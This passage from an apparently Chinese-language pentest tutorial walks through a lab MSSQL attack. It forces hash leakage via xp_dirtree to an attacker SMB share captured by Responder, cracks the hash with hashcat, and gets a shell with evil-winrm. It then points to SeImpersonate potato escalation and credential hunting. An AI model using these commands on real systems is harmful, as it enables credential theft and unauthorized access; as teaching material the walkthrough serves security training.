<div class="language-mssql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-mssql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">exec master..xp_dirtree &#x27;\\172.16.1.30\test&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">go</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250307161832630-2122953310-b27fd393780389cd783d4c8b14e19733.png" width="721" height="300" class="img_ev3q"></p>
<p>在 sqsh 中可以看到 SQL 命令虽已被执行，可似乎什么也没有发生。但当我们再次检查 Responder 时，发现它已成功的捕获到了 MSSQL 服务帐户的哈希值！</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250307161833677-52588715-cf27283955968ef17eb33e0002242173.png" width="1024" height="228" class="img_ev3q"></p>
<p>现在，我们需要拷贝这个哈希值并尝试破解它。这时 crackstation 网站已无法处理这种类型的哈希值，因此我们将使用 hashcat 工具。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="31破解服务账户的哈希"><strong><div id="id3.1">3.1、破解服务账户的哈希</div></strong><a href="#31破解服务账户的哈希" class="hash-link" aria-label="31破解服务账户的哈希的直接链接" title="31破解服务账户的哈希的直接链接">​</a></h4>
<p>将获取的哈希值复制到 TXT 文件中，</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250307161834796-1020498682-4b038c11d8353a5bfcfd6b2a2568e440.png" width="1024" height="166" class="img_ev3q"></p>
<p>然后通过以下命令确定 hashcat 要破解此类哈希所需的哈希模式：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">hashcat -h | grep -i &quot;netntlmv2&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250307161832511-1912199056-2770dcdbd5cef34e6a2075fe2add4edf.png" width="656" height="73" class="img_ev3q"></p>
<p>在这里，我们可以看到这种哈希的哈希模式是 5600，所以现在可以在 hashcat 命令中使用它，如下所示：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">hashcat -m 5600 ./responder_hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250307161832654-1046196798-04029e769db64ad32f551a59c624d703.png" width="739" height="83" class="img_ev3q"></p>
<p>短短 3 秒后，哈希值便被破解，然后就可以在 cracked.txt 文件中查看密码。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250307161832948-1016781952-7a2b621729f86c4501ff54372e6d1556.png" width="656" height="309" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250307161833779-1541176649-24e3d07173a5d2ae82aef520a7287d02.png" width="1024" height="142" class="img_ev3q"></p>
<p>就这样，我们现在拥有了 MSSQL 服务账户的凭证！</p>
<p><strong>MSSQL$SQLEXPRESS : service#1</strong></p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="32获取服务帐户的-shell"><strong><div id="id3.2">3.2、获取服务帐户的 Shell</div></strong><a href="#32获取服务帐户的-shell" class="hash-link" aria-label="32获取服务帐户的-shell的直接链接" title="32获取服务帐户的-shell的直接链接">​</a></h4>
<p>有了新的凭证后，我们可以在任何可能的地方（RDP、WinRM、SMB等）去测试它，以发现此帐户还有什么额外服务的访问权限。</p>
<p>当使用 crackmapexec 测试该凭证对 WinRM 的访问时，我们发现了下面信息：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">crackmapexec winrm 172.16.1.250 -u &#x27;MSSQL$SQLEXPRESS&#x27; -p &#x27;service#1&#x27; --local-auth</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250307161833457-1924937945-07007c05f8592828a488a0de921eddb2.png" width="973" height="128" class="img_ev3q"></p>
<p>看到 Pwn3d！这表示该用户是 Remote Management Users 组的成员，这意味着可以利用此服务来执行命令。</p>
<p>由于可以通过 WinRM 访问系统，因此我们使用一个名为 <a href="https://github.com/Hackplayers/evil-winrm" target="_blank" rel="noopener noreferrer">evil-winrm</a> 的工具以 MSSQL$SQLEXPRESS 的身份去获取受害者的 shell。</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">evil-winrm -u &#x27;MSSQL$SQLEXPRESS&#x27; -p &#x27;service#1&#x27; -i 172.16.1.250</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250307161834626-2123393180-36e49e87a0da1a1906c8045fab995321.png" width="1024" height="234" class="img_ev3q"></p>
<p>Amazing！就像在上一节看到 alice 那样，我们成功地执行了水平权限提升并增加了我们的访问权限！</p>
<blockquote>
<p>注：这种服务账户通常不会像在本示例中展示的那样很容易就被破解掉，但它提供了一个思路：如果服务的登录身份（服务-属性-登录-登录身份）是用户账户，那么这时候，这种方法就显得很有用了。【这种方法很有必要一试】</p>
</blockquote>
<p>此外，由于这是一个服务帐户，因此可以使用 whoami /priv 命令来检查它是否启用了 SeImpersonate 权限。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250307161833358-567684098-5faa2278350bab6b1f800078ddb378e8.png" width="661" height="288" class="img_ev3q"></p>
<p>在这里，可以看到 SeImpersonate 权限已启用！这意味着我们可以很容易地利用此权限通过 potato 攻击升级到 SYSTEM。</p>
<blockquote>
<p>要了解如何滥用 SeImpersonate 权限来获取 SYSTEM shell，可以查看这篇<a href="https://www.cnblogs.com/kqdssheng/p/18738762" target="_blank" rel="noopener noreferrer">文章</a>。</p>
</blockquote>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="4场景三在-mssql-中执行-cmd-命令"><strong><div id="id4">4、场景三：在 MSSQL 中执行 CMD 命令</div></strong><a href="#4场景三在-mssql-中执行-cmd-命令" class="hash-link" aria-label="4场景三在-mssql-中执行-cmd-命令的直接链接" title="4场景三在-mssql-中执行-cmd-命令的直接链接">​</a></h2>
<p>在这最后一个场景中，我们将看到使用特权账户 sa 访问 MSSQL 服务器时会发生什么。</p>
<blockquote>
<p>任何 MSSQL 帐户都可以具有特权，但 sa 账户是 MSSQL 的内置超级用户帐户。</p>
</blockquote>
<p>同样地，假设我们仍以用户 bob 的身份在目标系统上站稳了脚跟。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250307161834255-1109424593-b044a05a16ceb83388c3ed2c147d5c43.png" width="505" height="180" class="img_ev3q"></p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="41搜寻-mssql-特权用户-sa-的凭据"><strong><div id="id4.1">4.1、搜寻 MSSQL 特权用户 sa 的凭据</div></strong><a href="#41搜寻-mssql-特权用户-sa-的凭据" class="hash-link" aria-label="41搜寻-mssql-特权用户-sa-的凭据的直接链接" title="41搜寻-mssql-特权用户-sa-的凭据的直接链接">​</a></h4>
<p>现在我们已经有了立足点，那就可以从一些手动枚举开始，看看系统上是否有有趣的文件。</p>
<blockquote>
<p>当通过枚举本地服务发现 SQL Server 正在目标上运行时，我们将需要查找可能包含凭证的文件。而这些文件很可能就位于 Web 服务器目录 <code>C:\inetpub\www</code> 中。但是，它们也可能在其它任何地方出现（如果确实存在的话）。</p>
</blockquote>
<p>假设在枚举过程中，我们在 C 盘中发现了一个名为 customapp 的文件夹。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250307161833845-2009631898-900e518f3e081c4910f15966243d56b2.png" width="494" height="299" class="img_ev3q"></p>
<p>而这对我们来说很感兴趣，因为在 MSSQL 数据库中找到的自定义库的名称也叫 customdb。因此，该应用程序和数据库很有可能是存在联系的。</p>
<p>遍历该文件夹，在其子目录 Backup 中我们找到了一个有趣的 ZIP 文件。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250307161834547-167242392-f87469ef0348b761075c6e1f0f6741fb.png" width="434" height="227" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250307161834301-1301555422-3805c9bc3e4f12c7d14c65f4575fd1c0.png" width="461" height="220" class="img_ev3q"></p>
<p>将此文件通过 SMB 共享发送回攻击者机器以进行更仔细的查看。</p>
<p><img decoding="async" loading="lazy" src="data:image/png;base64,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